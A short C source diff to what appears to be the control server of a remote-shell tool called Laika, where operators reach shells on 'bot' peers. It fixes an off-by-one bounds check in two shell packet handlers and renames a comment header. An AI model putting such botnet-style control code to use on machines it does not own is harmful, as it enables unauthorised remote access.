@@ -41,7 +41,7 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
     laikaS_endOutPacket(authPeer);
 }
 
-/* ============================================[[ Packet Handlers ]]============================================= */
+/* =========================================[[ [Auth] Packet Handlers ]]========================================= */
 
 void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
@@ -100,7 +100,7 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
 
     /* ignore malformed packet */
-    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
+    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
         return;
 
     laikaC_closeShell(shell);
@@ -121,7 +121,7 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
     sz -= sizeof(uint32_t);
 
     /* ignore malformed packet */
-    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
+    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
         return;
 
     peer = shell->bot;
